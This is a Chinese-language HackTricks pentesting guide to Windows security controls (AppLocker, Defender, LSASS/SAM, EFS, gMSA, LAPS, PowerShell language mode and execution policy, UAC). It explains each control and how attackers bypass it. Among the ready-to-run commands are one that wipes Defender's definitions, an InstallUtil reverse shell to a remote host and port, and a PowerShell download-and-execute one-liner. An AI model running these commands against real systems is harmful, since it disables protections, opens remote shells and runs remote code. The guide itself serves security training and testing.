# Windows 安全控制

<details>

<summary><strong>从零到英雄学习 AWS 黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) 轻松构建并**自动化工作流程**，由世界上**最先进的**社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker 策略

应用程序白名单是一个批准的软件应用程序或可执行文件列表，允许它们存在并在系统上运行。目标是保护环境免受有害的恶意软件和未经批准的软件的侵害，这些软件不符合组织的特定业务需求。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) 是 Microsoft 的**应用程序白名单解决方案**，它使系统管理员能够控制**用户可以运行哪些应用程序和文件**。它提供了对可执行文件、脚本、Windows 安装程序文件、DLL、打包应用程序和打包应用程序安装程序的**细粒度控制**。\
组织通常会**阻止 cmd.exe 和 PowerShell.exe** 以及对某些目录的写入访问权限，**但这一切都可以被绕过**。

### 检查

检查哪些文件/扩展名被列入黑名单/白名单：
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
AppLocker 规则也可以**从本地注册表**读取，位于 **`HKLM\Software\Policies\Microsoft\Windows\SrpV2`**。

### 绕过

* 用于绕过 AppLocker 策略的**可写文件夹**：如果 AppLocker 允许在 `C:\Windows\System32` 或 `C:\Windows` 内执行任何内容，那么你可以使用**可写文件夹**来**绕过这个限制**。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* 常见的**信任**的[**"LOLBAS's"**](https://lolbas-project.github.io/)二进制文件也可以用来绕过AppLocker。
* **编写不当的规则也可能被绕过**
* 例如，**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，您可以在任何地方创建一个名为`allowed`的**文件夹**，它将被允许。
* 组织通常也专注于**阻止`%System32%\WindowsPowerShell\v1.0\powershell.exe`可执行文件**，但忘记了**其他**的[**PowerShell可执行文件位置**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations)，例如`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`或`PowerShell_ISE.exe`。
* **DLL执行很少启用**，因为它可能会给系统带来额外的负载，并且需要大量的测试来确保不会有任何故障。因此，使用**DLL作为后门将有助于绕过AppLocker**。
* 您可以使用[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)或[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)来**执行Powershell**代码，并在任何进程中绕过AppLocker。更多信息请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。

## 凭证存储

### 安全账户管理器 (SAM)

本地凭证存在于此文件中，密码是哈希处理的。

### 本地安全权限 (LSA) - LSASS

**凭证**（哈希处理的）被**保存**在此子系统的**内存**中，用于单点登录（SSO）目的。\
**LSA**管理本地**安全策略**（密码策略，用户权限...）、**认证**、**访问令牌**...\
LSA将会是那个在**SAM**文件中（对于本地登录）**检查**提供的凭证，并与**域控制器**通信以认证域用户的。

**凭证**被**保存**在**LSASS进程**内：Kerberos票据，NT和LM的哈希，容易解密的密码。

### LSA秘密

LSA可能会在磁盘上保存一些凭证：

* Active Directory的计算机账户密码（无法访问的域控制器）。
* Windows服务账户的密码
* 计划任务的密码
* 更多（IIS应用程序的密码...）

### NTDS.dit

它是Active Directory的数据库。它只存在于域控制器中。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) 是Windows 10和Windows 11以及Windows Server版本中可用的防病毒软件。它**阻止**常见的渗透测试工具，如**`WinPEAS`**。然而，有方法可以**绕过这些保护**。

### 检查

要检查**Defender**的**状态**，您可以执行PS cmdlet **`Get-MpComputerStatus`**（检查**`RealTimeProtectionEnabled`**的值以了解是否处于激活状态）：

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

要枚举它，您也可以运行：
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS (加密文件系统)

EFS 通过使用一个批量**对称密钥**加密文件，也被称为文件加密密钥，或者**FEK**。然后，FEK 被与加密文件的用户关联的**公钥**加密，这个加密的 FEK 存储在加密文件的 $EFS **备用数据流**中。为了解密文件，EFS 组件驱动程序使用与 EFS 数字证书（用于加密文件）匹配的**私钥**来解密存储在 $EFS 流中的对称密钥。来源[这里](https://en.wikipedia.org/wiki/Encrypting_File_System)。

文件在未经用户请求的情况下被解密的例子：

* 文件和文件夹在复制到另一个文件系统（如 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)）格式化的卷之前会被解密。
* 使用 SMB/CIFS 协议通过网络复制加密文件时，文件在通过网络发送之前会被解密。

使用此方法加密的文件可以被**拥有者用户透明访问**（加密它们的人），所以如果你能**成为那个用户**，你可以解密文件（更改用户密码并作为他登录不会起作用）。

### 检查 EFS 信息

检查一个**用户**是否**使用**了这项**服务**，检查这个路径是否存在：`C:\users\<username>\appdata\roaming\Microsoft\Protect`

使用 cipher /c \<file>\ 检查**谁**有权**访问**文件\
你也可以在文件夹内使用 `cipher /e` 和 `cipher /d` 来**加密**和**解密**所有文件

### 解密 EFS 文件

#### 成为系统权限

这种方式要求**受害用户**在主机内**运行**一个**进程**。如果是这种情况，使用 `meterpreter` 会话，你可以模仿用户进程的令牌（`impersonate_token` 来自 `incognito`）。或者你可以直接`迁移`到用户的进程。

#### 知道用户密码

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## 组管理服务账户 (gMSA)

在大多数基础设施中，服务账户是典型的用户账户，具有“**密码永不过期**”选项。维护这些账户可能是一件真正的麻烦事，这就是为什么微软引入了**管理服务账户**：

* 不再需要密码管理。它使用一个复杂的、随机的、240字符的密码，并在达到域或计算机密码过期日期时自动更改。
* 它使用 Microsoft 密钥分发服务 (KDC) 来创建和管理 gMSA 的密码。
* 它不能被锁定或用于交互式登录
* 支持跨多个主机共享
* 可用于运行计划任务（管理服务账户不支持运行计划任务）
* 简化的 SPN 管理 - 如果计算机的 **sAMaccount** 详情或 DNS 名称属性发生变化，系统将自动更改 SPN 值。

gMSA 账户的密码存储在一个名为 _**msDS-ManagedPassword**_ 的 LDAP 属性中，这个属性由 DC 每 30 天**自动**重置，可以由**授权管理员**和安装了它们的**服务器**检索。_**msDS-ManagedPassword**_ 是一个加密数据块，称为 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)，它只能在连接安全时检索，例如**LDAPS**，或者当认证类型为‘密封 & 安全’时。

![图片来自 https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

因此，如果正在使用 gMSA，请查找它是否具有**特殊权限**，并检查您是否有**权限**来**读取**服务的密码。

您可以使用 [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader) 读取此密码：
```
/GMSAPasswordReader --AccountName jkohler
```
还可以查看这个[网页](https://cube0x0.github.io/Relaying-for-gMSA/)，了解如何执行**NTLM中继攻击**来**读取** **gMSA**的**密码**。

## LAPS

\*\*\*\*[**本地管理员密码解决方案（LAPS）**](https://www.microsoft.com/en-us/download/details.aspx?id=46899)允许您**管理本地管理员密码**（该密码是**随机的**，唯一的，并且**定期更改**) 在域加入的计算机上。这些密码集中存储在Active Directory中，并使用ACL限制只有授权用户才能访问。如果您的用户被授予足够的权限，您可能能够读取本地管理员的密码。

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS 受限语言模式

PowerShell \*\*\*\* [**受限语言模式**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **锁定了许多使用PowerShell的必要功能**，例如阻止COM对象，只允许批准的.NET类型，基于XAML的工作流，PowerShell类等等。

### **检查**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### 绕过
```powershell
#Easy bypass
Powershell -version 2
```
在当前的Windows中，该Bypass将不起作用，但您可以使用[**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)。
**要编译它，您可能需要** _**添加引用**_ -> _浏览_ -> _浏览_ -> 添加 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` 并**将项目更改为.Net4.5**。

#### 直接绕过：
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### 反向 shell：
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
您可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 在任何进程中**执行Powershell**代码并绕过受限模式。更多信息请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。

## PS 执行策略

默认设置为**受限**。绕过此策略的主要方法：
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
更多信息可以在[这里](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)找到

## 安全支持提供者接口 (SSPI)

是可以用来认证用户的 API。

SSPI 负责为想要通信的两台机器找到合适的协议。首选的方法是 Kerberos。然后 SSPI 将协商将使用哪种认证协议，这些认证协议称为安全支持提供者 (SSP)，位于每台 Windows 机器内部，以 DLL 形式存在，两台机器必须支持相同的协议才能通信。

### 主要的 SSPs

* **Kerberos**：首选的
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** 和 **NTLMv2**：兼容性原因
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**：Web 服务器和 LDAP，密码以 MD5 哈希形式存在
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**：SSL 和 TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**：用于协商使用的协议（Kerberos 或 NTLM，Kerberos 是默认的）
* %windir%\Windows\System32\lsasrv.dll

#### 协商可能提供几种方法或只提供一种。

## UAC - 用户账户控制

[用户账户控制 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一个功能，它启用了**提升活动的同意提示**。

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 来轻松构建和**自动化工作流程**，由世界上**最先进的**社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong> 从零开始学习 AWS 黑客攻击！</strong></summary>

其他支持 HackTricks 的方式：

* 如果你想在 HackTricks 中看到你的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享你的黑客技巧**。

</details>
